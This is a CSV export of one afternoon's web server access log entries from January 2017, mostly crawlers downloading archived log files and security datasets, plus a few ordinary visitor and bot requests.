Log Format,Field 1,Field 2,Field 3,Field 4,Field 5,Field 6,Field 7
WSC,46.229.168.67,-,01/Jan/2017:12:06:03 -0800,GET /self.logs/error.log.2015-04-08.gz HTTP/1.1,200,557
WSC,46.229.168.69,-,01/Jan/2017:12:06:19 -0800,GET /self.logs/error.log.2015-05-23.gz HTTP/1.1,200,747
WSC,46.229.168.72,-,01/Jan/2017:12:06:43 -0800,GET /self.logs/access.log.2015-04-05.gz HTTP/1.1,200,3487
WSC,46.229.168.72,-,01/Jan/2017:12:07:01 -0800,GET /self.logs/error.log.2015-05-05.gz HTTP/1.1,200,649
WSC,46.229.168.66,-,01/Jan/2017:12:07:16 -0800,GET /self.logs/access.log.2015-04-27.gz HTTP/1.1,200,7295
WSC,46.229.168.67,-,01/Jan/2017:12:07:32 -0800,GET /self.logs/error.log.2016-03-18.gz HTTP/1.1,200,654
WSC,46.229.168.72,-,01/Jan/2017:12:07:58 -0800,GET /self.logs/error.log.2015-09-14.gz HTTP/1.1,200,1004
WSC,46.229.168.65,-,01/Jan/2017:12:08:12 -0800,GET /self.logs/access.log.2015-04-16.gz HTTP/1.1,200,11899
WSC,46.229.168.67,-,01/Jan/2017:12:08:34 -0800,GET /self.logs/access.log.2016-02-04.gz HTTP/1.1,200,7223
WSC,46.229.168.69,-,01/Jan/2017:12:09:00 -0800,GET /self.logs/access.log.2015-12-08.gz HTTP/1.1,200,9224
WSC,46.229.168.66,-,01/Jan/2017:12:09:14 -0800,GET /self.logs/access.log.2015-12-24.gz HTTP/1.1,200,5373
WSC,46.229.168.71,-,01/Jan/2017:12:09:33 -0800,GET /self.logs/error.log.2016-01-18.gz HTTP/1.1,200,1106
WSC,46.229.168.70,-,01/Jan/2017:12:09:58 -0800,GET /self.logs/error.log.2015-08-12.gz HTTP/1.1,200,957
WSC,46.229.168.71,-,01/Jan/2017:12:10:17 -0800,GET /self.logs/error.log.2015-11-18.gz HTTP/1.1,200,967
WSC,46.229.168.71,-,01/Jan/2017:12:10:36 -0800,GET /self.logs/access.log.2016-03-15.gz HTTP/1.1,200,7114
WSC,46.229.168.65,-,01/Jan/2017:12:10:57 -0800,GET /self.logs/access.log.2015-08-20.gz HTTP/1.1,200,5268
WSC,46.229.168.67,-,01/Jan/2017:12:11:15 -0800,GET /self.logs/access.log.2015-08-30.gz HTTP/1.1,200,4415
WSC,46.229.168.71,-,01/Jan/2017:12:11:35 -0800,GET /self.logs/access.log.2015-02-19.gz HTTP/1.1,200,12911
WSC,46.229.168.73,-,01/Jan/2017:12:12:03 -0800,GET /self.logs/access.log.2016-06-06.gz HTTP/1.1,200,8410
WSC,46.229.168.71,-,01/Jan/2017:12:12:12 -0800,GET /self.logs/error.log.2015-06-12.gz HTTP/1.1,200,1004
WSC,46.229.168.67,-,01/Jan/2017:12:12:26 -0800,GET /self.logs/error.log.2015-02-04.gz HTTP/1.1,200,501
WSC,46.229.168.74,-,01/Jan/2017:12:12:58 -0800,GET /self.logs/access.log.2015-01-25.gz HTTP/1.1,200,3024
WSC,46.229.168.74,-,01/Jan/2017:12:13:14 -0800,GET /self.logs/access.log.2016-05-19.gz HTTP/1.1,200,10166
WSC,46.229.168.73,-,01/Jan/2017:12:13:44 -0800,GET /self.logs/access.log.2015-06-16.gz HTTP/1.1,200,9097
WSC,46.229.168.69,-,01/Jan/2017:12:14:06 -0800,GET /self.logs/error.log.2015-08-31.gz HTTP/1.1,200,767
WSC,46.229.168.71,-,01/Jan/2017:12:14:12 -0800,GET /self.logs/access.log.2015-12-31.gz HTTP/1.1,200,6757
WSC,46.229.168.70,-,01/Jan/2017:12:14:51 -0800,GET /self.logs/access.log.2015-05-11.gz HTTP/1.1,200,5129
WSC,46.229.168.69,-,01/Jan/2017:12:14:56 -0800,GET /self.logs/access.log.2015-03-29.gz HTTP/1.1,200,3467
WSC,46.229.168.69,-,01/Jan/2017:12:15:29 -0800,GET /self.logs/access.log.2016-04-23.gz HTTP/1.1,200,6397
WSC,46.229.168.72,-,01/Jan/2017:12:15:20 -0800,GET /maccdc2012/weird.log.gz HTTP/1.1,200,305376
WSC,46.229.168.69,-,01/Jan/2017:12:15:45 -0800,GET /self.logs/access.log.2015-09-21.gz HTTP/1.1,200,5487
WSC,46.229.168.68,-,01/Jan/2017:12:16:06 -0800,GET /self.logs/error.log.2016-02-11.gz HTTP/1.1,200,830
WSC,46.229.168.67,-,01/Jan/2017:12:16:27 -0800,GET /self.logs/error.log.2015-11-24.gz HTTP/1.1,200,1024
WSC,46.229.168.74,-,01/Jan/2017:12:16:50 -0800,GET /self.logs/error.log.2015-07-31.gz HTTP/1.1,200,825
WSC,46.229.168.67,-,01/Jan/2017:12:17:04 -0800,GET /self.logs/error.log.2015-08-08.gz HTTP/1.1,200,742
WSC,46.229.168.66,-,01/Jan/2017:12:17:24 -0800,GET /self.logs/access.log.2015-03-10.gz HTTP/1.1,200,13373
WSC,46.229.168.65,-,01/Jan/2017:12:17:39 -0800,GET /self.logs/error.log.2015-10-19.gz HTTP/1.1,200,692
WSC,46.229.168.69,-,01/Jan/2017:12:18:16 -0800,GET /self.logs/access.log.2015-09-03.gz HTTP/1.1,200,4912
WSC,46.229.168.65,-,01/Jan/2017:12:18:23 -0800,GET /self.logs/access.log.2015-06-07.gz HTTP/1.1,200,3415
WSC,46.229.168.74,-,01/Jan/2017:12:18:50 -0800,GET /self.logs/access.log.2015-02-14.gz HTTP/1.1,200,25915
WSC,46.229.168.72,-,01/Jan/2017:12:19:06 -0800,GET /self.logs/error.log.2015-04-09.gz HTTP/1.1,200,581
WSC,46.229.168.68,-,01/Jan/2017:12:19:13 -0800,GET /self.logs/error.log.2015-06-21.gz HTTP/1.1,200,2241
WSC,46.229.168.70,-,01/Jan/2017:12:19:55 -0800,GET /self.logs/error.log.2015-03-03.gz HTTP/1.1,200,873
WSC,46.229.168.70,-,01/Jan/2017:12:19:55 -0800,GET /self.logs/error.log.2015-03-03.gz HTTP/1.1,200,873
WSC,46.229.168.73,-,01/Jan/2017:12:20:00 -0800,GET /self.logs/access.log.2015-07-26.gz HTTP/1.1,200,3464
WSC,46.229.168.65,-,01/Jan/2017:12:20:23 -0800,GET /self.logs/access.log.2015-02-28.gz HTTP/1.1,200,2949
WSC,46.229.168.65,-,01/Jan/2017:12:20:52 -0800,GET /self.logs/access.log.2016-03-24.gz HTTP/1.1,200,11197
WSC,46.229.168.73,-,01/Jan/2017:12:21:18 -0800,GET /self.logs/error.log.2016-05-27.gz HTTP/1.1,200,908
WSC,46.229.168.72,-,01/Jan/2017:12:21:31 -0800,GET /self.logs/access.log.2016-01-17.gz HTTP/1.1,200,4357
WSC,46.229.168.65,-,01/Jan/2017:12:21:53 -0800,GET /self.logs/error.log.2015-05-02.gz HTTP/1.1,200,834
WSC,46.229.168.65,-,01/Jan/2017:12:22:08 -0800,GET /self.logs/error.log.2015-01-20.gz HTTP/1.1,200,961
WSC,46.229.168.66,-,01/Jan/2017:12:22:29 -0800,GET /self.logs/error.log.2015-08-17.gz HTTP/1.1,200,1918
WSC,46.229.168.71,-,01/Jan/2017:12:22:45 -0800,GET /self.logs/access.log.2016-04-11.gz HTTP/1.1,200,8778
WSC,46.229.168.69,-,01/Jan/2017:12:23:13 -0800,GET /self.logs/access.log.2015-09-06.gz HTTP/1.1,200,4835
WSC,46.229.168.74,-,01/Jan/2017:12:23:26 -0800,GET /self.logs/error.log.2015-01-22.gz HTTP/1.1,200,651
WSC,46.229.168.67,-,01/Jan/2017:12:23:57 -0800,GET /self.logs/error.log.2015-02-14.gz HTTP/1.1,200,9852
WSC,46.229.168.74,-,01/Jan/2017:12:23:58 -0800,GET /self.logs/access.log.2015-12-21.gz HTTP/1.1,200,10544
WSC,46.229.168.70,-,01/Jan/2017:12:24:31 -0800,GET /self.logs/error.log.2016-04-16.gz HTTP/1.1,200,924
WSC,46.229.168.74,-,01/Jan/2017:12:24:38 -0800,GET /self.logs/access.log.2015-07-16.gz HTTP/1.1,200,7253
WSC,46.229.168.66,-,01/Jan/2017:12:24:55 -0800,GET /self.logs/error.log.2015-05-11.gz HTTP/1.1,200,1103
WSC,46.229.168.69,-,01/Jan/2017:12:25:28 -0800,GET /self.logs/error.log.2015-08-21.gz HTTP/1.1,200,1053
WSC,46.229.168.65,-,01/Jan/2017:12:25:42 -0800,GET /self.logs/access.log.2015-11-14.gz HTTP/1.1,200,5305
WSC,46.229.168.71,-,01/Jan/2017:12:25:55 -0800,GET /self.logs/error.log.2015-08-06.gz HTTP/1.1,200,692
WSC,46.229.168.67,-,01/Jan/2017:12:26:11 -0800,GET /self.logs/access.log.2015-07-30.gz HTTP/1.1,200,4058
WSC,46.229.168.72,-,01/Jan/2017:12:26:32 -0800,GET /self.logs/?C=D%3BO%3DA HTTP/1.1,200,14663
WSC,46.229.168.68,-,01/Jan/2017:12:27:08 -0800,GET /self.logs/access.log.2016-04-21.gz HTTP/1.1,200,23644
WSC,46.229.168.70,-,01/Jan/2017:12:27:12 -0800,GET /self.logs/access.log.2016-05-22.gz HTTP/1.1,200,11571
WSC,221.4.169.197,-,01/Jan/2017:12:27:16 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279362
WSC,46.229.168.65,-,01/Jan/2017:12:27:28 -0800,GET /self.logs/access.log.2015-09-26.gz HTTP/1.1,200,3612
WSC,46.229.168.65,-,01/Jan/2017:12:27:50 -0800,GET /self.logs/access.log.2015-08-11.gz HTTP/1.1,200,5970
WSC,46.229.168.67,-,01/Jan/2017:12:28:19 -0800,GET /self.logs/access.log.2015-06-15.gz HTTP/1.1,200,7949
WSC,46.229.168.73,-,01/Jan/2017:12:28:29 -0800,GET /auth.log/auth.log.gz HTTP/1.1,200,304719
WSC,221.4.169.197,-,01/Jan/2017:12:27:04 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,933960
WSC,46.229.168.66,-,01/Jan/2017:12:28:42 -0800,GET /self.logs/error.log.2016-05-15.gz HTTP/1.1,200,522
WSC,46.229.168.65,-,01/Jan/2017:12:29:05 -0800,GET /self.logs/error.log.2016-04-02.gz HTTP/1.1,200,623
WSC,54.172.242.152,-,01/Jan/2017:12:29:12 -0800,GET /self.logs/access.log.2015-02-14.gz HTTP/1.1,200,25834
WSC,46.229.168.70,-,01/Jan/2017:12:29:28 -0800,GET /self.logs/error.log.2015-11-16.gz HTTP/1.1,200,598
WSC,46.229.168.71,-,01/Jan/2017:12:29:40 -0800,GET /self.logs/error.log.2016-04-08.gz HTTP/1.1,200,692
WSC,46.229.168.70,-,01/Jan/2017:12:30:01 -0800,GET /self.logs/error.log.2015-11-10.gz HTTP/1.1,200,591
WSC,46.229.168.68,-,01/Jan/2017:12:30:13 -0800,GET /self.logs/error.log.2015-04-18.gz HTTP/1.1,200,1070
WSC,46.229.168.71,-,01/Jan/2017:12:30:35 -0800,GET /self.logs/access.log.2015-03-07.gz HTTP/1.1,200,2711
WSC,46.229.168.65,-,01/Jan/2017:12:30:52 -0800,GET /self.logs/access.log.2015-07-24.gz HTTP/1.1,200,4106
WSC,46.229.168.73,-,01/Jan/2017:12:31:11 -0800,GET /self.logs/access.log.2015-08-24.gz HTTP/1.1,200,22786
WSC,46.229.168.73,-,01/Jan/2017:12:31:30 -0800,GET /self.logs/access.log.2015-08-13.gz HTTP/1.1,200,4622
WSC,46.229.168.68,-,01/Jan/2017:12:31:49 -0800,GET / HTTP/1.1,200,10230
WSC,46.229.168.73,-,01/Jan/2017:12:32:07 -0800,GET /self.logs/error.log.2015-07-28.gz HTTP/1.1,200,652
WSC,66.249.66.197,-,01/Jan/2017:12:32:30 -0800,GET /robots.txt HTTP/1.1,301,502
WSC,66.249.66.103,-,01/Jan/2017:12:32:30 -0800,GET /robots.txt HTTP/1.1,200,334
WSC,66.249.66.209,-,01/Jan/2017:12:32:31 -0800,GET / HTTP/1.1,301,483
WSC,66.249.66.105,-,01/Jan/2017:12:32:31 -0800,GET / HTTP/1.1,200,10267
WSC,46.229.168.65,-,01/Jan/2017:12:32:31 -0800,GET /self.logs/error.log.2015-02-15.gz HTTP/1.1,200,5772
WSC,46.229.168.68,-,01/Jan/2017:12:32:46 -0800,GET /self.logs/access.log.2016-05-04.gz HTTP/1.1,200,17024
WSC,46.229.168.66,-,01/Jan/2017:12:33:00 -0800,GET /maccdc2012/ssh.log.gz HTTP/1.1,200,182480
WSC,46.229.168.65,-,01/Jan/2017:12:33:22 -0800,GET /self.logs/error.log.2015-09-17.gz HTTP/1.1,200,796
WSC,46.229.168.68,-,01/Jan/2017:12:33:38 -0800,GET /self.logs/access.log.2016-03-06.gz HTTP/1.1,200,7444
WSC,46.229.168.71,-,01/Jan/2017:12:33:54 -0800,GET /self.logs/error.log.2015-05-20.gz HTTP/1.1,200,776
WSC,46.229.168.65,-,01/Jan/2017:12:34:12 -0800,GET /self.logs/error.log.2016-05-22.gz HTTP/1.1,200,682
WSC,46.229.168.73,-,01/Jan/2017:12:34:31 -0800,GET /self.logs/error.log.2015-06-22.gz HTTP/1.1,200,2801
WSC,46.229.168.67,-,01/Jan/2017:12:34:51 -0800,GET /self.logs/error.log.2016-03-16.gz HTTP/1.1,200,795
WSC,46.229.168.73,-,01/Jan/2017:12:35:08 -0800,GET /self.logs/error.log.2016-04-22.gz HTTP/1.1,200,713
WSC,46.229.168.67,-,01/Jan/2017:12:35:25 -0800,GET /self.logs/access.log.2015-01-31.gz HTTP/1.1,200,4200
WSC,46.229.168.73,-,01/Jan/2017:12:35:50 -0800,GET /self.logs/error.log.2015-04-05.gz HTTP/1.1,200,1012
WSC,46.229.168.69,-,01/Jan/2017:12:36:03 -0800,GET /self.logs/error.log.2015-01-25.gz HTTP/1.1,200,574
WSC,46.229.168.65,-,01/Jan/2017:12:36:24 -0800,GET /self.logs/access.log.2016-06-01.gz HTTP/1.1,200,9916
WSC,46.229.168.71,-,01/Jan/2017:12:36:42 -0800,GET /self.logs/error.log.2016-05-17.gz HTTP/1.1,200,650
WSC,46.229.168.67,-,01/Jan/2017:12:37:01 -0800,GET /self.logs/error.log.2015-01-18.gz HTTP/1.1,200,1222
WSC,46.229.168.66,-,01/Jan/2017:12:37:14 -0800,GET /self.logs/access.log.2016-04-08.gz HTTP/1.1,200,19909
WSC,46.229.168.70,-,01/Jan/2017:12:37:33 -0800,GET /self.logs/error.log.2015-02-25.gz HTTP/1.1,200,989
WSC,46.229.168.67,-,01/Jan/2017:12:37:48 -0800,GET /self.logs/error.log.2015-07-16.gz HTTP/1.1,200,646
WSC,46.229.168.73,-,01/Jan/2017:12:38:10 -0800,GET /self.logs/error.log.2015-10-13.gz HTTP/1.1,200,712
WSC,46.229.168.74,-,01/Jan/2017:12:38:29 -0800,GET /self.logs/access.log.2015-09-07.gz HTTP/1.1,200,4049
WSC,46.229.168.65,-,01/Jan/2017:12:38:45 -0800,GET /self.logs/access.log.2015-06-02.gz HTTP/1.1,200,3760
WSC,46.229.168.71,-,01/Jan/2017:12:39:10 -0800,GET /self.logs/access.log.2016-03-30.gz HTTP/1.1,200,8775
WSC,46.229.168.74,-,01/Jan/2017:12:39:22 -0800,GET /self.logs/error.log.2016-04-23.gz HTTP/1.1,200,605
WSC,46.229.168.66,-,01/Jan/2017:12:39:41 -0800,GET /self.logs/access.log.2015-04-22.gz HTTP/1.1,200,14685
WSC,46.229.168.73,-,01/Jan/2017:12:40:03 -0800,GET /self.logs/access.log.2016-06-10.gz HTTP/1.1,200,16817
WSC,46.229.168.65,-,01/Jan/2017:12:40:15 -0800,GET /self.logs/error.log.2016-05-23.gz HTTP/1.1,200,757
WSC,46.229.168.70,-,01/Jan/2017:12:40:35 -0800,GET /self.logs/access.log.2015-05-14.gz HTTP/1.1,200,6083
WSC,46.229.168.66,-,01/Jan/2017:12:41:01 -0800,GET /self.logs/error.log.2015-07-29.gz HTTP/1.1,200,705
WSC,46.229.168.72,-,01/Jan/2017:12:41:09 -0800,GET /self.logs/access.log.2015-02-11.gz HTTP/1.1,200,4623
WSC,46.229.168.68,-,01/Jan/2017:12:41:31 -0800,GET /self.logs/error.log.2015-11-29.gz HTTP/1.1,200,623
WSC,46.229.168.74,-,01/Jan/2017:12:41:49 -0800,GET /self.logs/error.log.2015-06-26.gz HTTP/1.1,200,763
WSC,46.229.168.69,-,01/Jan/2017:12:42:06 -0800,GET /self.logs/error.log.2015-03-28.gz HTTP/1.1,200,922
WSC,46.229.168.74,-,01/Jan/2017:12:42:22 -0800,GET /self.logs/error.log.2015-11-05.gz HTTP/1.1,200,1076
WSC,46.229.168.70,-,01/Jan/2017:12:42:42 -0800,GET /self.logs/error.log.2015-05-21.gz HTTP/1.1,200,787
WSC,46.229.168.70,-,01/Jan/2017:12:43:01 -0800,GET /self.logs/error.log.2015-02-26.gz HTTP/1.1,200,1013
WSC,46.229.168.72,-,01/Jan/2017:12:43:15 -0800,GET /self.logs/access.log.2015-05-06.gz HTTP/1.1,200,6588
WSC,46.229.168.71,-,01/Jan/2017:12:43:39 -0800,GET /self.logs/access.log.2015-06-09.gz HTTP/1.1,200,8175
WSC,46.229.168.68,-,01/Jan/2017:12:43:52 -0800,GET /self.logs/error.log.2015-06-06.gz HTTP/1.1,200,719
WSC,46.229.168.68,-,01/Jan/2017:12:44:11 -0800,GET /self.logs/error.log.2015-06-17.gz HTTP/1.1,200,1115
WSC,46.229.168.72,-,01/Jan/2017:12:44:28 -0800,GET /self.logs/error.log.2015-07-01.gz HTTP/1.1,200,1008
WSC,46.229.168.69,-,01/Jan/2017:12:44:51 -0800,GET /self.logs/access.log.2016-04-10.gz HTTP/1.1,200,8376
WSC,46.229.168.67,-,01/Jan/2017:12:45:01 -0800,GET /self.logs/access.log.2016-04-22.gz HTTP/1.1,200,7997
WSC,46.229.168.74,-,01/Jan/2017:12:45:29 -0800,GET /self.logs/access.log.2015-10-31.gz HTTP/1.1,200,7220
WSC,46.229.168.72,-,01/Jan/2017:12:45:41 -0800,GET /self.logs/access.log.2016-02-08.gz HTTP/1.1,200,6677
WSC,46.229.168.65,-,01/Jan/2017:12:45:56 -0800,GET /self.logs/access.log.2015-07-12.gz HTTP/1.1,200,4540
WSC,46.229.168.70,-,01/Jan/2017:12:46:17 -0800,GET /self.logs/access.log.2015-09-14.gz HTTP/1.1,200,5491
WSC,46.229.168.71,-,01/Jan/2017:12:46:35 -0800,GET /self.logs/access.log.2016-04-25.gz HTTP/1.1,200,9383
WSC,46.229.168.73,-,01/Jan/2017:12:46:56 -0800,GET /self.logs/access.log.2015-10-07.gz HTTP/1.1,200,7000
WSC,46.229.168.72,-,01/Jan/2017:12:47:11 -0800,GET /self.logs/access.log.2015-12-22.gz HTTP/1.1,200,6223
WSC,46.229.168.65,-,01/Jan/2017:12:47:31 -0800,GET /self.logs/error.log.2016-03-20.gz HTTP/1.1,200,854
WSC,46.229.168.67,-,01/Jan/2017:12:47:46 -0800,GET /self.logs/error.log.2015-09-11.gz HTTP/1.1,200,666
WSC,46.229.168.70,-,01/Jan/2017:12:48:04 -0800,GET /self.logs/access.log.2016-02-07.gz HTTP/1.1,200,9101
WSC,46.229.168.65,-,01/Jan/2017:12:48:26 -0800,GET /self.logs/access.log.2015-07-10.gz HTTP/1.1,200,3969
WSC,46.229.168.69,-,01/Jan/2017:12:48:40 -0800,GET /self.logs/error.log.2016-05-13.gz HTTP/1.1,200,1038
WSC,46.229.168.68,-,01/Jan/2017:12:49:00 -0800,GET /self.logs/access.log.2015-09-09.gz HTTP/1.1,200,4674
WSC,46.229.168.74,-,01/Jan/2017:12:49:19 -0800,GET /self.logs/access.log.2015-09-10.gz HTTP/1.1,200,6075
WSC,46.229.168.65,-,01/Jan/2017:12:49:37 -0800,GET /self.logs/access.log.2015-12-07.gz HTTP/1.1,200,6438
WSC,46.229.168.65,-,01/Jan/2017:12:49:52 -0800,GET /self.logs/access.log.2016-02-03.gz HTTP/1.1,200,7249
WSC,46.229.168.65,-,01/Jan/2017:12:50:15 -0800,GET /self.logs/error.log.2015-02-24.gz HTTP/1.1,200,1666
WSC,46.229.168.65,-,01/Jan/2017:12:50:29 -0800,GET /self.logs/access.log.2015-03-18.gz HTTP/1.1,200,9455
WSC,46.229.168.71,-,01/Jan/2017:12:50:48 -0800,GET /maccdc2012/files.log.gz HTTP/1.1,200,306117
WSC,46.229.168.68,-,01/Jan/2017:12:51:09 -0800,GET /self.logs/access.log.2016-06-07.gz HTTP/1.1,200,9140
WSC,46.229.168.66,-,01/Jan/2017:12:51:24 -0800,GET /self.logs/access.log.2015-01-20.gz HTTP/1.1,200,3633
WSC,46.229.168.70,-,01/Jan/2017:12:51:42 -0800,GET /self.logs/access.log.2016-02-02.gz HTTP/1.1,200,7973
WSC,46.229.168.74,-,01/Jan/2017:12:52:04 -0800,GET /self.logs/error.log.2015-04-07.gz HTTP/1.1,200,663
WSC,46.229.168.74,-,01/Jan/2017:12:52:17 -0800,GET /self.logs/access.log.2015-11-27.gz HTTP/1.1,200,5589
WSC,46.229.168.71,-,01/Jan/2017:12:52:37 -0800,GET /self.logs/error.log.2016-02-17.gz HTTP/1.1,200,831
WSC,46.229.168.74,-,01/Jan/2017:12:52:56 -0800,GET /self.logs/access.log.2015-06-01.gz HTTP/1.1,200,4327
WSC,46.229.168.65,-,01/Jan/2017:12:53:13 -0800,GET /self.logs/error.log.2015-12-18.gz HTTP/1.1,200,521
WSC,46.229.168.66,-,01/Jan/2017:12:53:32 -0800,GET /self.logs/access.log.2015-11-09.gz HTTP/1.1,200,6120
WSC,46.229.168.72,-,01/Jan/2017:12:53:49 -0800,GET /self.logs/access.log.2015-12-12.gz HTTP/1.1,200,5412
WSC,46.229.168.71,-,01/Jan/2017:12:54:09 -0800,GET /self.logs/error.log.2015-12-13.gz HTTP/1.1,200,629
WSC,46.229.168.73,-,01/Jan/2017:12:54:24 -0800,GET /self.logs/error.log.2015-03-06.gz HTTP/1.1,200,798
WSC,46.229.168.67,-,01/Jan/2017:12:54:42 -0800,GET /self.logs/access.log.2016-03-21.gz HTTP/1.1,200,6585
WSC,46.229.168.67,-,01/Jan/2017:12:54:59 -0800,GET /self.logs/error.log.2016-01-02.gz HTTP/1.1,200,859
WSC,46.229.168.66,-,01/Jan/2017:12:55:23 -0800,GET /self.logs/access.log.2015-09-08.gz HTTP/1.1,200,3824
WSC,46.229.168.72,-,01/Jan/2017:12:55:42 -0800,GET /self.logs/error.log.2015-11-11.gz HTTP/1.1,200,581
WSC,66.102.6.129,-,01/Jan/2017:12:58:40 -0800,GET / HTTP/1.1,200,10267
WSC,66.102.6.159,-,01/Jan/2017:12:58:40 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,104.131.86.190,-,01/Jan/2017:13:34:56 -0800,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1,200,1614760
WSC,113.108.192.2,-,01/Jan/2017:13:37:39 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,200,930836
WSC,185.182.49.31,-,01/Jan/2017:13:40:59 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0,200,930799
WSC,70.106.209.116,-,01/Jan/2017:13:47:59 -0800,GET / HTTP/1.1,304,189
WSC,37.144.52.198,-,01/Jan/2017:13:53:46 -0800,GET / HTTP/1.1,200,10230
WSC,37.144.52.198,-,01/Jan/2017:13:54:00 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7391
WSC,37.144.52.198,-,01/Jan/2017:13:54:00 -0800,GET /twitter-icon.png HTTP/1.1,200,27751
WSC,66.249.66.101,-,01/Jan/2017:13:57:30 -0800,GET / HTTP/1.1,200,10267
WSC,176.195.113.223,-,01/Jan/2017:14:00:02 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,200,930799
WSC,66.249.83.84,-,01/Jan/2017:14:00:30 -0800,GET / HTTP/1.1,200,10267
WSC,66.249.83.83,-,01/Jan/2017:14:00:30 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,157.55.39.100,-,01/Jan/2017:14:17:19 -0800,GET / HTTP/1.1,200,10267
WSC,131.253.27.116,-,01/Jan/2017:14:17:23 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7372
WSC,131.253.27.116,-,01/Jan/2017:14:17:29 -0800,GET /twitter-icon.png HTTP/1.1,200,27732
WSC,207.46.13.157,-,01/Jan/2017:14:19:55 -0800,GET /robots.txt HTTP/1.1,200,289
WSC,123.125.67.224,-,01/Jan/2017:14:29:09 -0800,GET /robots.txt HTTP/1.1,200,297
WSC,180.76.15.33,-,01/Jan/2017:14:48:36 -0800,GET / HTTP/1.1,304,152
WSC,104.162.192.217,-,01/Jan/2017:14:51:42 -0800,GET /favicon.ico HTTP/1.1,200,268
WSC,96.250.56.15,-,01/Jan/2017:15:02:16 -0800,GET / HTTP/1.1,200,10267
WSC,96.250.56.15,-,01/Jan/2017:15:02:16 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,96.250.56.15,-,01/Jan/2017:15:02:16 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7427
WSC,96.250.56.15,-,01/Jan/2017:15:02:16 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,24.142.90.210,-,01/Jan/2017:15:07:10 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,24.142.90.210,-,01/Jan/2017:15:07:15 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,24.142.90.210,-,01/Jan/2017:15:07:20 -0800,GET / HTTP/1.1,200,34374
